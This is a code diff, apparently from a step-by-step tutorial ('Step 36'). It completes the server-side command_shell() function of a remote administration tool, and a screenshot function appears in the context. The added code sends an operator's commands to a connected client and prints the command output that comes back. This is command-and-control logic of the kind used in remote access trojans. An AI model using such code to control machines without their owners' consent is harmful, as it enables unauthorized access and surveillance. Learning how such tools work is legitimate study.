@@ -303,10 +303,16 @@ def screenshot(all_monitors=True):
 def command_shell():
     send(b'cmd')
 
-    # in the Firs Receive we give the prompt
+    # First Receive: Receive Prompt from the Client
+    strDefault = '\n' + decode_utf8(recv(intBuff)) + '$>> '
+    print(strDefault, end='')
+
+    # 1. Give Command from user, 2. Send Command to the Client, 3. Receive Command Output from the Client
     while True:
+        # 1. Give Command from the user
         strCommand = input('>> ')
 
+        # 2. Send Command to the Client
         # Send 'goback' to the client to close the Command Prompt and Back to the Command Mode(menu)
         if strCommand == 'quit' or strCommand == 'exit':
             send(b'goback')
@@ -320,8 +326,20 @@ def command_shell():
         elif len(str(strCommand)) > 0:
             send(str.encode(strCommand))
 
-            # Second Receive we give the output(STDOUT+STDERR) of the Executed Command
-            # TODO: Complete this
+            # Step 36: Complete `command_shell()` to Receive Stdout - Server Side
+            # 3. Receive Command Output(stdout+stderr) from the Client
+
+            # First Receive len of stdout+stderr
+            intBuffer = int(decode_utf8(recv(intBuff)))
+            # Then Receive stdout+stderr completely
+            strClientResponse = decode_utf8(recvall(intBuffer))
+
+            # Print results of executed command on the Client machine
+            print(strClientResponse, end='')
+
+        # else, Mean command is empty, so print default prompt
+        else:
+            print(strDefault, end='')
 
 
 
